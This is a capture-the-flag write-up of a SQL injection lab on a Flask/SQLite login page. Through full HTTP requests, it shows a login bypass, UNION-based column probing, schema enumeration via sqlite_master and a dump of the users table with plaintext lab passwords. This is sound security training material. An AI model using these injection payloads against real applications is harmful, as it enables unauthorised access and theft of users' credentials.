# Challenge 7 - Vulnerable Startup: Broken Authentication 2

> This challenge builds upon the previous challenge. Here, the goal is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection. The login form is still vulnerable to SQL injection, and it is possible to bypass the login by using ' OR 1=1-- - as a username. Before dumping all the passwords, we need to identify places where results from the login query is returned within the application.

![Pasted image 20210804155929](Pasted%20image%2020210804155929.png)

The goal of the challenge is to dump all the passwords in the database to retrieve the flag, but without using blind injection. It seems that some portion of the login query (probably the username) is rendered somewhere on the page after a successful authentication, and the goal is to inject into the query such that instead of the username being rendered, database information is.

The backend SQL query used for authentication probably looks something like:

```sql
SELECT username FROM $USER_TABLE WHERE username = '$USERNAME' AND password = '$PASSWORD_HASH'
```

Logging in with the username `tgihf' OR 1=1--` logs in as `admin`, indicating that the `username` parameter is injectable.

![Pasted image 20210804160331](Pasted%20image%2020210804160331.png)

If the `password` parameter is hashed before being inserted into the SQL query, it won't be vulnerable. Using the password `pass' OR 1=1--` logs in as `admin` as well, also indicating that the `password` parameter is not being hashed and is thus injectable.

Upon successful authentication, the application grabs the username of the first record from the successful query and renders it in the web application. This means that it will be impossible to replace the username with the results of arbitrary `SELECT` statements to achive the goal of the challenge. Instead, a `UNION` injection must be attempted. The union injection must also ensure that the `UNION`'d record appears first in the resultant row set.

The first step is to figure out how many columns are being requested by the original SQL statement by using incremental `ORDER BY` statements.

Injecting an `ORDER BY 2` clause causes the application to successfully authenticate.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+ORDER+BY+2--&password=woo
```

```html
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 239
Location: http://10.10.109.43:5000/challenge2/home
Vary: Cookie
Set-Cookie: session=.eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.YQr1EA.tI-cjOso2Yb6Dw9EbTJF5S0aQM0; HttpOnly; Path=/; SameSite=Lax
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 04 Aug 2021 20:14:08 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/challenge2/home">/challenge2/home</a>.  If not click the link.
```

Injecting an `ORDER BY 3` clause causes the application to reject authentication, even though we are bypassing authentication with the username `admin`. This indicates that the `ORDER BY 3` clause caused a SQL error, which resulted in the application not authenticating the session. This indicates that there are only two columns in the resultant row set of the original SQL query.

The next step is to determine the type of each of the columns that are in the resultant row set of the original SQL query using an incremental `UNION SELECT NULL` statement.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+1,NULL--&password=woo
```

We find that all string/integer combinations of the two columns in the `UNION SELECT` injection trigger 302 redirects. This indicates that SQLite is probably the backend database system, as it often coerces data to make it fit the column's type without returning errors. Unfortunately, this doesn't give any indication as to what the column types are.

After a bit of trial and error with the parameters, it appears that the first parameter is of type integer and the second parameter is of type string. The parameters are likely `id` and `username`. This means the backend SQL query probably looks like:

```sql
SELECT id, username FROM $USER_TABLE WHERE username = '$USERNAME' AND password = '$PASSWORD'
```

Since the web application renders the username of the first record from the resultant row set, it must be assured that the `UNION`'d record appears first in the resultant row set. This is achievable by ordering the resultant row set by the integer parameter at index 1 and setting the `UNION`'d integer parameter at index 1 as a negative number, since the application presumably doesn't use negative numbers as user IDs.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,'tgihf'+ORDER+BY+1--&password=woo	
```

![Pasted image 20210804162940](Pasted%20image%2020210804162940.png)

This confirms that we are able to both successfully inject into the target application and render injected query output.

Since the goal is to dump the passwords in the database, the next step is to determine the backend database type.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,sqlite_version()--&password=woo	
```

Indicates SQLite version 3.22.0.

![Pasted image 20210804163310](Pasted%20image%2020210804163310.png)

The next step is to determine how many non SQLite system tables are present.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,(SELECT+COUNT(*)+FROM+sqlite_master+WHERE+type+%3d+'table'+AND+name+NOT+LIKE+'sqlite_%25')--&password=woo	
```

There is only one. Determine its name.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,(SELECT+name+FROM+sqlite_master+WHERE+type+%3d+'table'+AND+name+NOT+LIKE+'sqlite_%25')--&password=woo	
```

Its name is `users`.

![Pasted image 20210804163824](Pasted%20image%2020210804163824.png)

Determine how many columns are in the table, their names, and ther types.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,(SELECT+sql+FROM+sqlite_master+WHERE+type+%3d+'table'+AND+name+=+'users')--&password=woo	
```

The following SQL statement was used to create the table, which indicates the number of columns, their names, and their types.

```sql
CREATE TABLE users (
    id integer primary key,
    username text unique not null,
    password text not null
)
```

Determine how many rows are in the table.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,(SELECT+COUNT(*)+FROM+users)--&password=woo
```

There are six rows in the table. Dump the table by incrementing through the `LIMIT` offsets, 0-5 and concatenating the column values.

```http
POST /challenge2/login HTTP/1.1
Host: 10.10.109.43:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Origin: http://10.10.109.43:5000
DNT: 1
Connection: close
Referer: http://10.10.109.43:5000/challenge2/login
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=admin'+UNION+SELECT+-50,(SELECT+id||':'||username||':'||password+FROM+users+LIMIT+0,1)+ORDER+BY+1--&password=woo
```

| id | username | password |
| --- | --- | --- |
| 1 | admin | rcLYWHCxeGUsA9tH3GNV |
| 2 | dev | asd |
| 3 | amanda | Summer2019! |
| 4 | maja | 345m3io4hj3 |
| 5 | awe32Flage32x | $THM_FLAG |
| 6 | emil | viking123 |

The 5th record contains the flag.